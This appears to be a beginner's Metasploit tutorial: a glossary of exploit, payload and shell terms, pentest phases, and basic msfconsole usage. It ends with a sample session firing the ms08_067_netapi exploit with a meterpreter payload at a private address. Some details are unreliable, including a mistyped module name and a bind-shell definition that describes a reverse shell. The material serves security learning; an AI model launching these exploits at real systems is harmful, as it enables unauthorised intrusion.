# Metasploit

Is a computer security project that provides information about security vulnerabilities and aids in penetration testing.

### Terminologies
1. `Database`

The database stores target host data, system logs, collected data and report data.

2. `Advanced scan`

Is an internal metasploit scan that combines Nmap and metasploit modules for target scanning and detection.

If you don't have Nexpose or a scan of data to import into Metasploit Community, you can run a scan to collect target information.

There are several scan speeds that can be configured for advanced scanning.

The scan rate determines the method used by advanced scanning to perform the detection processes.

3. `Exploit`

An exploit is a program that takes advantage of a certain vulnerability for its own purposes and provides an attacker with access to a target system.

The exploit usually carries the payload and delivers it to the target system.

Eg > one of the most exploit is windows / smb / s08-067_netapi, which targets a vulnerability in the Windows Server service that could allow remote code execution. 

You can run an exploit against a computer with vulnerability ms0-067 in order to take control of the system.

4. `Listener`

The listener waits for an incoming connection from the exploited target or from the attacking machine, and after receiving the connection controls it.

5. `Meterpreter`

Meterpreter is an advanced multipurpose payload that provides you with an interactive shell.

From the Meterpreter shell, you can download a file, get the password hashes for a user account, and infiltrate other networks.

The meterpreter runs in memory, so it is undetectable by most detection systems.

6. `Module`

Is a stand-alone piece of code or software that extends the functionality of the Metasploit Framework.

The module automates the functionality provided by the metasploit framework and allows you to perform Metasploit Community tasks.

The module can be an exploit, helper, payload, No Operation Payload(NOP), or post-exploitation module.

The type of the module determines its purpose eg any module that launches a shell on a target is an operational module.

7. `Payload`

Payload is a valid code that acts on the target system after the exploit has successfully completed.

The payload can be a reverse or bind shell payload, main difference being the direction of the connection after the exploit.

8. `Bind shell`

The linked shell connects back to the attacking machines as a command line.

9. `Reverse shell payload`

The reverse shell connnects back to the attacking machines as a command line.

10. `Shell`

The shell is a console-like interface that gives you access to a remote target.

11. `Shellcode`

The shellcode is  a set of instructions that an exploit uses as a payload.

12. `Target`

The target system that you want to research and can represent a single host, multiple hosts, a range of network or an entire network.

13. `Vulnerability`

Is a security flaw or weakness in an application or system that allows an attacker compromise the target system.

A compromised system can lead to privilege escalation, DoS, Unauthorized access to data, password theft, and buffer overflows.

### Metasploit Community pentesting steps;
1. **Information Gathering**

Used an advanced scan, Nexpose scan or an important tool to provide metasploit Community with a list of targets and active services and open ports associated with those targets.

2. **Exploitation**

Use smart exploits or manually exploits to launch attacks against targeted machines.

You can launch brute force attacks to elevate the privileges of a user account and gain access to the exploited machine.

3. **Post-exploitation**

Use post-exploitation modules or interactive sessions to interactively collect more information from hacked targets.

Metasploit Community provides several tools to interact with open sessions on a live machine.

4. **Reporting**

Use the reporting system to generate a report with detailed penetration test results.

Metasploit community provides several types of reports to help determine the type of information that a report includes.

5. **Cleanup**

Use the cleanup tool to close any open session on an exploitable target, as well as remove any information about the data used during the penetration test. This step restores the original settings on the target system.

### What the Metasploit Project includes;
- 1141 Auxiliary Modules
- 2142 Exploits
- 592 Payloads
- 45 Encoders
- 365 Post Exploits
- 10 Nops
- 8 Evasion (and more)

### Basic Metasploit usage
- write `msfconsole` in terminal
- To use the exploit write: **use exploit full path** eg => `use exploit/windows/smb/ms17_010_eternalblue`
- To see the configurations of Exploit write `options`
- To set parameter write **set parameter_name value** eg => `set RHOSTS 10.10.11.10`
- If the exploit has multiple targets use `show targets`
- To select Target use : **set targets target_ID** eg => `set targets 1`
- To Launch the exploit use `exploit`

###### Common Mistakes
- LHOST is not properly configured
- Payload is not matching
- Wrong Target
- Wrong RHOST and Service Port
- Missing a Required Parameter
- LPORT is being blocked by Firewall

eg of an exploit

```
┌──(fraize㉿fraize)-[~]
└─$ msfconsole 
msf6 > use windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.1.1
RHOST => 192.168.1.1
msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
```

